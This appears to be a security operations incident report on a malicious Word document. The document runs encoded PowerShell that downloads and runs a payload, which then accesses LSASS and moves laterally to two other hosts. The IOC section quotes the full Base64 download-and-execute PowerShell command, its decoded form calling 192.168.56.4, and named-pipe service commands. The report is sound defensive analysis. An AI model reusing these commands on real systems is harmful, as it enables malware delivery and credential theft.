# SOC Offense 5

## Offense Details

- **Date & Time:** September 10, 2026, 12:40:57 AM
- **Magnitude:** 3
- **Source:** CRE, Windows Auth Server Tiger-PC, Windows Auth Server Machine A, Windows Auth Server Machine B
- **Offense Name:** Detected a process preceded by unusual process launched a command shell. Preceded by a process created a thread into LSASS process. Preceded by PowerShell malicious usage detected with encoded command, containing process create.
- **Affected Users:** tiger-PC\tiger, NT Authority\system, tiger, MACHINE B\tiger, MACHINE A\tiger
- **Affected Hosts:** Tiger-PC, Machine A, Machine B

## Rules Triggered (EC Sysmon)

1. Process launched from temp directory
2. Detected a service configured to use a Pipe
3. Detected a new unseen process started with system user privileges
4. Process created a thread into lsass process
5. Process created a thread from a process that was launched from temp directory
6. Detected a malicious access to lsass process from unknown call trace
7. Detected a possible credential dumping tool
8. Detected a malicious access to lsass process
9. A remoting service created a PowerShell script file
10. Detected a remotely executed process over multiple hosts
11. Unusual process launched a command shell
12. Detected an unknown/unseen process
13. PowerShell malicious usage detected with encoded command
14. PowerShell has been launched
15. Metasploit PSExec module has been detected

## Network Details

- **Source IP:** 192.168.107.107
- **Destination IP:** 192.168.107.107
- **Payload download URL:** http://192.168.56.4/myLove.exe

## Timeline

- **12:40:57:** winword.exe opens hello.docx and launches cmd.exe, which runs powershell.exe with ExecutionPolicy Bypass and an encoded command (Sysmon ID 1)
- **12:40:58:** PowerShell process create with encoded command (Sysmon ID 1)
- **12:40:59:** myLove.exe process create from the Temp directory on Tiger-PC (Sysmon ID 1)
- **12:41:** services.exe spawns cmd.exe as SYSTEM, writes "anqibt" to a named pipe (Sysmon ID 1)
- **12:41:01:** A service was installed (cmd.exe /c echo anqibt to the pipe)
- **12:41:02:** services.exe spawns cmd.exe as SYSTEM, writes "xgefyo" to a named pipe (Sysmon ID 1)
- **12:41:03:** Create Remote Thread from myLove.exe into lsass.exe, repeated 2 times (Sysmon ID 8)
- **12:41:05:** Process Access to lsass.exe, possible credential dumping tool (Sysmon ID 10)
- **12:41:07:** wsmprovhost.exe creates a .ps1 file on Machine A (Sysmon ID 11)
- **12:41:08:** wsmprovhost.exe creates a .ps1 file on Machine B (Sysmon ID 11)
- **12:41:09:** myLove.exe process create on Machine B through wmiprvse.exe (Sysmon ID 1)
- **12:41:11:** winword.exe launches cmd.exe with powershell.exe, ExecutionPolicy Bypass and the encoded command again (Sysmon ID 1)
- **12:41:11:** calc.exe process create, launched by Explorer.exe (Sysmon ID 1)
- **12:41:12:** PowerShell process create with execution policy and encoded command (Sysmon ID 1)
- **Machine A:** process create for the same myLove.exe hash, remotely executed process over multiple hosts (no time in notes)
- **No time in notes:** Metasploit PSExec Module Has Been Detected (Sysmon, Exp Center event list)

## Analysis

The observed activity is highly suspicious and is consistent with a malicious document leading to PowerShell-based payload execution and subsequent post-exploitation activity.

The initial process chain shows winword.exe opening hello.docx, after which Word launches cmd.exe, which in turn invokes powershell.exe with -ExecutionPolicy Bypass and an encoded command. Decoding the Base64 PowerShell command reveals that it creates a System.Net.WebClient object and downloads myLove.exe from http://192.168.56.4/myLove.exe into `C:\Users\tiger\AppData\Local\Temp\myLove.exe`, followed by Start-Process to execute the downloaded binary.

This establishes a clear Word -> CMD -> PowerShell -> Download -> execution chain, and the use of encoded PowerShell together with an execution policy bypass is a strong indicator of defense evasion.

The Create Remote Thread event involving myLove.exe, together with process access activity and the presence of multiple UNKNOWN call-trace addresses, is particularly concerning because remote-thread creation and cross-process access can be associated with process injection or manipulation, although the exact injection technique cannot be confirmed from these events alone.

The execution of wmiprvse.exe through myLove.exe further indicates possible use of WMI (Windows Management Instrumentation) for execution or system interaction, while the creation of a temporary .ps1 file through wsmprovhost.exe suggests possible WinRM / PowerShell remoting activity.

The services.exe parent spawning cmd.exe commands that write random strings such as anqibt and xgefyo to named pipes also indicates named pipe based inter-process communication and may represent communication between the payload and another component.

The repeated hash AD7B9C14083B52BC532FBA5948342B98 identifies the same executable/process artifact across events, but the hash alone doesn't establish maliciousness without reputation or sandbox analysis.

## MITRE ATT&CK Mapping

1. **Execution (TA0002)**
   - Technique: T1204.002 User Execution: Malicious File, T1059.001 PowerShell, T1059.003 Windows Command Shell, T1047 Windows Management Instrumentation

2. **Defense Evasion (TA0005)**
   - Technique: T1027.010 Command Obfuscation

3. **Command and Control (TA0011)**
   - Technique: T1105 Ingress Tool Transfer

4. **Credential Access (TA0006)**
   - Technique: T1003.001 OS Credential Dumping: LSASS Memory

5. **Lateral Movement (TA0008)**
   - Technique: T1021.006 Remote Services: Windows Remote Management, T1021.002 Remote Services: SMB/Windows Admin Shares, T1569.002 System Services: Service Execution

## IOCs

**Files and paths**

- **Document:** hello.docx, opened from `C:\Users\Tiger\Desktop\hello.docx`
- **Payload:** myLove.exe, `C:\Users\tiger\AppData\Local\Temp\myLove.exe` (Tiger-PC), `C:\Windows\System32\myLove.exe` (Machine B)
- **PowerShell script (Machine A):** `C:\Users\tiger\AppData\Local\Temp\1q1zzk+0.3ur.ps1`, created by `C:\Windows\System32\wsmprovhost.exe`
- **PowerShell script (Machine B):** `C:\Users\Tiger\AppData\Local\Temp\jtznabq0.rvl.ps1`, created by `C:\Windows\System32\wsmprovhost.exe`
- **Target process:** `C:\Windows\System32\lsass.exe`
- **Other process:** calc.exe, `C:\Windows\System32\calc.exe`, launched by `C:\Windows\Explorer.exe` (12:41:11)

**Hashes**

- **AD7B9C14083B52BC532FBA5948342B98 (MD5):** cmd.exe, repeated across process create events (child of winword.exe and of services.exe)
- **A9B9581F5F7F0869915F9C6023F2F0AA:** myLove.exe process create on Tiger-PC
- **AFF54E9B7F56D6A4C918795592D3413CD2BF1579 (SHA1):** myLove.exe on Machine A and Machine B
- **60B7C0FEAD45F2066E5B805A91F4F0FC:** calc.exe on Tiger-PC
- **Imphash:** 481F47BBB2C9C21E108D65F52B04C448 (Machine A)

**Commands**

- **Parent command line:** `"C:\Program Files\Microsoft Office\Office16\winword.exe" /n "C:\Users\Tiger\Desktop\hello.docx" /o "u"` (seen at 12:40:57 and 12:41:11)
- **Process command line:** `cmd.exe /c powershell.exe -ExecutionPolicy Bypass ^-^e^Nco^De KABOAGUdwAtAE8AYg=`
- **Encoded PowerShell command:** `powershell.exe -ExecutionPolicy Bypass -eNcoDe KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANQA2AC4ANAAvAG0AeQBMAG8AdgBlAC4AZQB4AGUAJwAsACAAIgBDADoAXABVAHMAZQByAHMAXAB0AGkAZwBlAHIAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAG0AeQBMAG8AdgBlAC4AZQB4AGUAIgApADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAIgBDADoAXABVAHMAZQByAHMAXAB0AGkAZwBlAHIAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAG0AeQBMAG8AdgBlAC4AZQB4AGUAIgA=`
- **Decoded command:** `(New-Object System.Net.WebClient).DownloadFile('http://192.168.56.4/myLove.exe', "C:\Users\tiger\AppData\Local\Temp\myLove.exe"); Start-Process "C:\Users\tiger\AppData\Local\Temp\myLove.exe"`
- **Named pipe commands (services.exe parent, SYSTEM):** `cmd.exe /c echo anqibt > \\.\pipe\anqibt`, `cmd.exe /c echo xgefyo > \\.\pipe\xgefyo`
- **Machine B parent:** `C:\Windows\System32\wbem\wmiprvse.exe -secured -Embedding`

**LSASS access (Sysmon ID 10)**

- **Granted access:** 0x1010
- **Call trace:** `C:\Windows\SYSTEM32\ntdll.dll+45d94|C:\Windows\system32\KERNELBASE.dll+b3a2|UNKNOWN(00F818E1)|UNKNOWN(00F81B7D)|UNKNOWN(00F81E5E)|UNKNOWN(00F82AD8)|UNKNOWN(00F619C5)|UNKNOWN(00F615A1)|UNKNOWN(00F61A37)|UNKNOWN(00F614D9)|UNKNOWN(008B74B6)|UNKNOWN(008B73A0)|UNKNOWN(008B78A3)|C:\Windows\system32\kernel32.dll+53c45|C:\Windows\SYSTEM32\ntdll.dll+637f5|C:\Windows\SYSTEM32\ntdll.dll+637c8`

**Network**

- **Payload URL:** http://192.168.56.4/myLove.exe
- **Source IP / Destination IP:** 192.168.107.107

**Accounts and hosts**

- **Users:** tiger-pc\tiger, NT AUTHORITY\SYSTEM, MACHINE A\tiger, MACHINE B\tiger
- **Logon IDs:** 0x2591a (tiger), 0x3e7 (SYSTEM)
- **Hosts:** Tiger-PC, Machine A, Machine B
- **Log sources:** Windows Auth Server @ EC:Tiger-PC, Windows Auth Server @ Machine A, Windows Auth Server @ Machine B, CRE-8 QRadar XPro

## Recommendations

1. Isolate all three affected hosts (Tiger-PC, Machine A, Machine B) and treat as higher priority.
2. Confirm whether this activity matches a scheduled/authorized red-team or pentest engagement before treating it as a live breach.
3. Preserve hello.docx, myLove.exe, the PowerShell script and process/network telemetry from all three hosts.
4. Submit the hash to sandbox analysis.
5. Treat the tiger accounts as potentially compromised across all three machines and reset credentials.

## Classification

**True Positive.** Malicious activity, as a new child process cmd.exe was created through the winword.exe parent process.
